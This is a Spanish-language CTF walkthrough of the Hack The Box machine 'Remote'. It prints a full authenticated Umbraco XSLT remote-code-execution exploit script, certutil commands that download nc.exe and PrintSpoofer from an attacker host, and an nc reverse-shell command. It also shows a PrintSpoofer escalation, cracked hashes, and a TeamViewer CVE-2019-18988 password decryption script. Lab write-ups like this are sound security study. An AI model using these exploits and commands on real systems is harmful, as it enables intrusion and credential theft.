---
tags:
title: Remote - Easy (HTB)
permalink: /Remote-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
	---
# Introduccion

# Reconocimiento

```bash
nmap -sCV -p21,80,111,135,139,445,2049,5985,47001,49664,49665,49666,49667,49678,49679,49680 10.129.230.172
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 15:34 -03
Nmap scan report for 10.129.230.172
Host is up (0.85s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|_  100005  1,2,3       2049/udp6  mountd
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-08T19:38:51
|_  start_date: N/A
|_clock-skew: 1h02m11s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 697.90 seconds
```

## Website / Port 80

En el sitio principal no hay nada de nada.

![image-center](/assets/images/{60482BE0-7C32-4C71-A2D7-32A36C1815C5}.png)
## Login site

Si me voy al apartado de contacto, veo la siguiente interfaz.

![image-center](/assets/images/{42C5E6B3-83EB-4FF6-8340-15112F1AADDF}.png)

Si clickeo en el botón me redirige a la ruta de `umbraco`, con un panel de login, del cual por ahora no dispongo de sus credenciales.

>`Umbraco CMS` es un sistema de gestión de contenido (CMS) de código abierto, flexible y potente, construido sobre la tecnología .NET de Microsoft, que permite crear y gestionar sitios web, intranets y aplicaciones complejas sin necesidad de programar desde cero.

![image-center](/assets/images/{217AC008-124A-43F5-98C2-E28ACAD8EB07}.png)
## NFS 

Como el puerto `2049` perteneciente al protocolo `NFS`, esta abierto, puedo usar `showmount` para ver las monturas hechas y compartidas a nivel de red.

```bash
showmount -e 10.129.230.172
Export list for 10.129.230.172:
/site_backups (everyone)
```

Veo una, por lo que ahora tengo que realizar la montura en mi maquina.

```bash
mount -t nfs 10.129.230.172:/site_backups /tmp/mnt
```

Hay varios archivos.

```bash
ls               
App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config
```
### Creds

Al parecer por el nombre de las carpetas el `CMS` que corre por detrás es `Umbraco`.
Es así como en el directorio `App_Data`, veo un archivo `.sdf`, con metadatos de `umbraco`, para ver las cadenas imprimibles use `strings` y metí el contenido en un archivo

```bash
strings umbraco.sfd > sdf_data.txt
```

Y viendo el contenido del output, vi unas credenciales para el usuario `admin`.

```bash
 cat sdf_data.txt                               
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
```

Me dirigí a la pagina de [CrackStation](https://crackstation.net/) para poder crackear ambos hashes.

![image-center](/assets/images/{CDDA2620-EB87-4DAA-9270-E8F350E45D66}.png)
## Shell as defaultappool

Ya dentro de la sesión como el usuario `admin`, no se ve nada de nada a simple vista.

![image-center](/assets/images/{C39EE452-D370-4515-B9B3-6B09EF4A30FE}.png)

Pero si me voy a la sección de `Help` veo una versión. 

![image-center](/assets/images/{B88ED6CA-2989-4AF0-B394-685B4ACA71D0}.png)

Buscando por exploit para dicha versión encontré los siguientes.

```bash
searchsploit umbraco
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Umbraco CMS - Remote Command Execution (Metasploit)                                                                       | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                                | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                                                                | aspx/webapps/49488.py
Umbraco CMS 8.9.1 - Directory Traversal                                                                                   | aspx/webapps/50241.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting                                                                | php/webapps/44988.txt
Umbraco v8.14.1 - 'baseUrl' SSRF                                                                                          | aspx/webapps/50462.txt
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Los que tengo en cuenta con los de ejecución remota de comandos con autenticación, ya que tengo una sesión como el `admin` de la pagina. Sin embargo tengo que aclarar que dicho `exploit` lo tuve que modificar ya que ambos fallaban. 
Dicho exploit queda de la siguiente manera:

```python
#!/usr/bin/env python3
# Exploit Title: Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)
# Fixed version with better error handling and debugging

import requests
import re
import argparse
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(prog='exploit.py',
    description='Umbraco authenticated RCE',
    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=80))
parser.add_argument('-u', '--user', metavar='USER', type=str,
    required=True, dest='user', help='username / email')
parser.add_argument('-p', '--password', metavar='PASS', type=str,
    required=True, dest='password', help='password')
parser.add_argument('-i', '--host', metavar='URL', type=str, required=True,
    dest='url', help='root URL')
parser.add_argument('-c', '--command', metavar='CMD', type=str, required=True,
    dest='command', help='command')
parser.add_argument('-a', '--arguments', metavar='ARGS', type=str, required=False,
    dest='arguments', help='arguments', default='')
parser.add_argument('-d', '--debug', action='store_true',
    help='Enable debug mode to see responses')
args = parser.parse_args()

escaped_arguments = args.arguments.replace('\\', '\\\\')
escaped_command = args.command.replace('\\', '\\\\')


payload = """\
<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "%s"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "%s"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>\
""" % (escaped_arguments, escaped_command)

login = args.user
password = args.password
host = args.url.rstrip('/')


requests.packages.urllib3.disable_warnings()

print("[*] Attempting to authenticate...")

url_login = host + "/backoffice/UmbracoApi/Authentication/PostLogin"
loginfo = {"username": login, "password": password}
s = requests.session()

try:
    r2 = s.post(url_login, json=loginfo, verify=False)
    
    if args.debug:
        print(f"[DEBUG] Login response status: {r2.status_code}")
        print(f"[DEBUG] Login response: {r2.text[:500]}")
    
    # Check if login was successful
    if r2.status_code == 200:
        try:
            response_json = r2.json()
            if args.debug:
                print(f"[DEBUG] Login JSON response: {response_json}")
        except:
            pass
        print("[+] Authentication successful!")
    else:
        print(f"[-] Authentication failed with status code: {r2.status_code}")
        exit(1)

except Exception as e:
    print(f"[-] Login request failed: {e}")
    exit(1)

print("[*] Accessing XSLT visualizer page...")
url_xslt = host + "/developer/Xslt/xsltVisualize.aspx"

try:
    r3 = s.get(url_xslt, verify=False)
    
    if args.debug:
        print(f"[DEBUG] XSLT page status: {r3.status_code}")
        print(f"[DEBUG] XSLT page length: {len(r3.text)}")
        print(f"[DEBUG] Cookies: {s.cookies}")
        
        with open('xslt_page.html', 'w') as f:
            f.write(r3.text)
        print("[DEBUG] Saved page to xslt_page.html")
    
    if r3.status_code != 200:
        print(f"[-] Failed to access XSLT page. Status code: {r3.status_code}")
        exit(1)
    
    soup = BeautifulSoup(r3.text, 'html.parser')
    
    viewstate_elem = soup.find(id="__VIEWSTATE")
    viewstategenerator_elem = soup.find(id="__VIEWSTATEGENERATOR")
    
    if not viewstate_elem:
        print("[-] Could not find __VIEWSTATE element on page")
        print("[*] This could mean:")
        print("    1. Login was unsuccessful")
        print("    2. The URL path is incorrect")
        print("    3. The Umbraco version doesn't match")
        print("    4. You don't have permission to access this page")
        
        if "login" in r3.url.lower() or "umbraco/umbraco.aspx" in r3.text.lower():
            print("[-] Appears to be redirected to login page - authentication may have failed")
        
        exit(1)
    
    VIEWSTATE = viewstate_elem['value']
    VIEWSTATEGENERATOR = viewstategenerator_elem['value']
    
    if 'UMB-XSRF-TOKEN' not in s.cookies:
        print("[-] UMB-XSRF-TOKEN cookie not found")
        exit(1)
    
    UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN']
    
    print("[+] Found necessary tokens, preparing exploit...")
    
    headers = {'UMB-XSRF-TOKEN': UMBXSRFTOKEN}
    data = {
        "__EVENTTARGET": "",
        "__EVENTARGUMENT": "",
        "__VIEWSTATE": VIEWSTATE,
        "__VIEWSTATEGENERATOR": VIEWSTATEGENERATOR,
        "ctl00$body$xsltSelection": payload,
        "ctl00$body$contentPicker$ContentIdValue": "",
        "ctl00$body$visualizeDo": "Visualize+XSLT"
    }
    
    print("[*] Executing payload...")
    r4 = s.post(url_xslt, data=data, headers=headers, verify=False)
    
    if args.debug:
        print(f"[DEBUG] Exploit response status: {r4.status_code}")
        with open('exploit_response.html', 'w') as f:
            f.write(r4.text)
        print("[DEBUG] Saved response to exploit_response.html")
    
    soup = BeautifulSoup(r4.text, 'html.parser')
    result_elem = soup.find(id="result")
    
    if result_elem:
        CMDOUTPUT = result_elem.getText()
        print("\n[+] Command output:")
        print("=" * 50)
        print(CMDOUTPUT)
        print("=" * 50)
    else:
        print("[-] Could not find result element in response")
        if args.debug:
            print("[DEBUG] Check exploit_response.html for details")

except Exception as e:
    print(f"[-] Exploit failed: {e}")
    if args.debug:
        import traceback
        traceback.print_exc()
    exit(1)
```

Para ver si funcionaba ejecute un `whoami` en el servidor, obteniendo asi esta respuesta:

```bash
 python3 ex.py -u admin@htb.local -p baconandcheese -i http://remote.htb/umbraco/ -c 'whoami'      
[*] Attempting to authenticate...
[+] Authentication successful!
[*] Accessing XSLT visualizer page...
[+] Found necessary tokens, preparing exploit...
[*] Executing payload...

[+] Command output:
==================================================
iis apppool\defaultapppool

==================================================
```

Como tengo ejecucion de comandos me descargue el `nc.exe` en la maquina con el siguiente comando:

```bash
python3 ex.py -u admin@htb.local -p baconandcheese -i http://remote.htb/umbraco/ -c 'certutil.exe' -a '-split -urlcache -f http://10.10.17.19/nc.exe C:\programdata\nc.exe'
[*] Attempting to authenticate...
[+] Authentication successful!
[*] Accessing XSLT visualizer page...
[+] Found necessary tokens, preparing exploit...
[*] Executing payload...

[+] Command output:
==================================================
****  Online  ****
  0000  ...
  6e00
CertUtil: -URLCache command completed successfully.

==================================================
```

Y además vi los permisos y privilegios de dicho usuario, viendo así que dispone del privilegio `SeImpersonatePrivilege`.

```bash                                                                                 
python3 ex.py -u admin@htb.local -p baconandcheese -i http://remote.htb/umbraco/ -c 'cmd.exe' -a '/c whoami /priv'
[*] Attempting to authenticate...
[+] Authentication successful!
[*] Accessing XSLT visualizer page...
[+] Found necessary tokens, preparing exploit...
[*] Executing payload...

[+] Command output:
==================================================

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

==================================================
```

Ya por ultimo me envie la shell a mi maquina.

```bash
 python3 ex.py -u admin@htb.local -p baconandcheese -i http://remote.htb/umbraco/ -c 'C:\programdata\nc.exe' -a '10.10.17.19 4444 -e cmd.exe'
[*] Attempting to authenticate...
[+] Authentication successful!
[*] Accessing XSLT visualizer page...
[+] Found necessary tokens, preparing exploit...
[*] Executing payload...
```

Y desde mi listener la recibo.

```powershell
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.230.172] 49691
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```
## Shell as nt authority\system

### Unintended path

La via no intencionada, seria esta y para eso me descargue el `PrintSpoofer.exe` para poder obtener una shell como `system`.

```powershell
c:\windows\system32\inetsrv>certutil -split -urlcache -f http://10.10.17.19/PrintSpoofer64.exe C:\programdata\PrintSpoofer64.exe
certutil -split -urlcache -f http://10.10.17.19/PrintSpoofer64.exe C:\programdata\PrintSpoofer64.exe
****  Online  ****
  0000  ...
  6a00
CertUtil: -URLCache command completed successfully.
```

Y con el siguiente comando le indico que el comando a ejecutar es una `cmd` y una shell interactiva.

```powershell
C:\ProgramData>.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
## Intended path

### CVE-2019-18988

Viendo procesos, veo uno inusual el cual es `TeamViewer.exe`.

```powershell
ps
<SNIP>
...
23     5632      19008              2308   0 TeamViewer_Service 
```

Además en su carpeta indica que se usa la versión `7`, donde en este [enlace](https://nvd.nist.gov/vuln/detail/CVE-2019-18988) se explica la vulnerabilidad, la cual te permite las claves de cifrado y un bypass de control de acceso, con la cual se usaba la misma clave de cifrado para cifrar datos sensibles, como las contraseñas permanentes, o valores como `SecurityPasswordAES`, en el registro, el cual se consulta de la siguiente manera .

```powershell
PS C:\Program Files (x86)\TeamViewer\version7> reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer /s
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer /s

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7
    StartMenuGroup    REG_SZ    TeamViewer 7
    InstallationDate    REG_SZ    2020-02-20
    InstallationDirectory    REG_SZ    C:\Program Files (x86)\TeamViewer\Version7
    Always_Online    REG_DWORD    0x1
    Security_ActivateDirectIn    REG_DWORD    0x0
    Version    REG_SZ    7.0.43148
    ClientIC    REG_DWORD    0x11f25831
    PK    REG_BINARY    BFAD2AEDB6C89AE0A0FD0501A0C5B9A5C0D957A4CC57C1884C84B6873EA03C069CF06195829821E28DFC2AAD372665339488DD1A8C85CDA8B19D0A5A2958D86476D82CA0F2128395673BA5A39F2B875B060D4D52BE75DB2B6C91EDB28E90DF7F2F3FBE6D95A07488AE934CC01DB8311176AEC7AC367AB4332ABD048DBFC2EF5E9ECC1333FC5F5B9E2A13D4F22E90EE509E5D7AF4935B8538BE4A606AB06FE8CC657930A24A71D1E30AE2188E0E0214C8F58CD2D5B43A52549F0730376DD3AE1DB66D1E0EBB0CF1CB0AA7F133148D1B5459C95A24DDEE43A76623759017F21A1BC8AFCD1F56FD0CABB340C9B99EE3828577371B7ADA9A8F967A32ADF6CF062B00026C66F8061D5CFF89A53EAE510620BC822BC6CC615D4DE093BC0CA8F5785131B75010EE5F9B6C228E650CA89697D07E51DBA40BF6FC3B2F2E30BF6F1C01F1BC2386FA226FFFA2BE25AE33FA16A2699A1124D9133F18B50F4DB6EDA2D23C2B949D6D2995229BC03507A62FCDAD55741B29084BD9B176CFAEDAAA9D48CBAF2C192A0875EC748478E51156CCDD143152125AE7D05177083F406703ED44DCACCD48400DD88A568520930BED69FCD672B15CD3646F8621BBC35391EAADBEDD04758EE8FC887BACE6D8B59F61A5783D884DBE362E2AC6EAC0671B6B5116345043257C537D27A8346530F8B7F5E0EBACE9B840E716197D4A0C3D68CFD2126E8245B01E62B4CE597AA3E2074C8AB1A4583B04DBB13F13EB54E64B850742A8E3E8C2FAC0B9B0CF28D71DD41F67C773A19D7B1A2D0A257A4D42FC6214AB870710D5E841CBAFCD05EF13B372F36BF7601F55D98ED054ED0F321AEBA5F91D390FF0E8E5815E6272BA4ABB3C85CF4A8B07851903F73317C0BC77FA12A194BB75999319222516
    SK    REG_BINARY    F82398387864348BAD0DBB41812782B1C0ABB9DAEEF15BC5C3609B2C5652BED7A9A07EA41B3E7CB583A107D39AFFF5E06DF1A06649C07DF4F65BD89DE84289D0F2CBF6B8E92E7B2901782BE8A039F2903552C98437E47E16F75F99C07750AEED8CFC7CD859AE94EC6233B662526D977FFB95DD5EB32D88A4B8B90EC1F8D118A7C6D28F6B5691EB4F9F6E07B6FE306292377ACE83B14BF815C186B7B74FFF9469CA712C13F221460AC6F3A7C5A89FD7C79FF306CEEBEF6DE06D6301D5FD9AB797D08862B9B7D75B38FB34EF82C77C8ADC378B65D9ED77B42C1F4CB1B11E7E7FB2D78180F40C96C1328970DA0E90CDEF3D4B79E08430E546228C000996D846A8489F61FE07B9A71E7FB3C3F811BB68FDDF829A7C0535BA130F04D9C7C09B621F4F48CD85EA97EF3D79A88257D0283BF2B78C5B3D4BBA4307D2F38D3A4D56A2706EDAB80A7CE20E21099E27481C847B49F8E91E53F83356323DDB09E97F45C6D103CF04693106F63AD8A58C004FC69EF8C506C553149D038191781E539A9E4E830579BCB4AD551385D1C9E4126569DD96AE6F97A81420919EE15CF125C1216C71A2263D1BE468E4B07418DE874F9E801DA2054AD64BE1947BE9580D7F0E3C138EE554A9749C4D0B3725904A95AEBD9DACCB6E0C568BFA25EE5649C31551F268B1F2EC039173B7912D6D58AA47D01D9E1B95E3427836A14F71F26E350B908889A95120195CC4FD68E7140AA8BB20E211D15C0963110878AAB530590EE68BF68B42D8EEEB2AE3B8DEC0558032CFE22D692FF5937E1A02C1250D507BDE0F51A546FE98FCED1E7F9DBA3281F1A298D66359C7571D29B24D1456C8074BA570D4D0BA2C3696A8A9547125FFD10FBF662E597A014E0772948F6C5F9F7D0179656EAC2F0C7F
    LastMACUsed    REG_MULTI_SZ    \0005056957918
    MIDInitiativeGUID    REG_SZ    {514ed376-a4ee-4507-a28b-484604ed0ba0}
    MIDVersion    REG_DWORD    0x1
    ClientID    REG_DWORD    0x6972e4aa
    CUse    REG_DWORD    0x1
    LastUpdateCheck    REG_DWORD    0x659d58d6
    UsageEnvironmentBackup    REG_DWORD    0x1
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
    Security_PasswordStrength    REG_DWORD    0x3

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7\AccessControl
    AC_Server_AccessControlType    REG_DWORD    0x0

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7\DefaultSettings
    Autostart_GUI    REG_DWORD    0x1
```

Como veo el valor `SecurityPasswordAES`, puedo usar el script en este [PoC](https://github.com/reversebrain/CVE-2019-18988/blob/master/CVE-2019-18988.py) para poder desencriptar las claves guardadas.
### Script

```powershell
cat aes.py 
import sys, hexdump, binascii
from Crypto.Cipher import AES

key = binascii.unhexlify("0602000000a400005253413100040000")
iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")

# reg query "HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7"
password = "FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B"
ciphertext = binascii.unhexlify(password)

aes = AES.new(key, AES.MODE_CBC, iv)

raw = aes.decrypt(ciphertext)
print(hexdump.hexdump(raw))

password = raw.decode('utf-16')
print(password)
```

Ejecutándolo veo la siguiente contraseña.

```bash
python3 aes.py                              
00000000: 21 00 52 00 33 00 6D 00  30 00 74 00 65 00 21 00  !.R.3.m.0.t.e.!.
00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
None
!R3m0te!
```

Probándola para el usuario `Administrator` gano acceso a la maquina como `system`.

```bash
 impacket-psexec remote.htb/administrator:'!R3m0te!'@10.129.230.172 -dc-ip 10.129.230.172 -target-ip 10.129.230.172
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.230.172.....
[*] Found writable share ADMIN$
[*] Uploading file xUrXscJq.exe
[*] Opening SVCManager on 10.129.230.172.....
[*] Creating service wMft on 10.129.230.172.....
[*] Starting service wMft.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

`~Happy Hacking.`





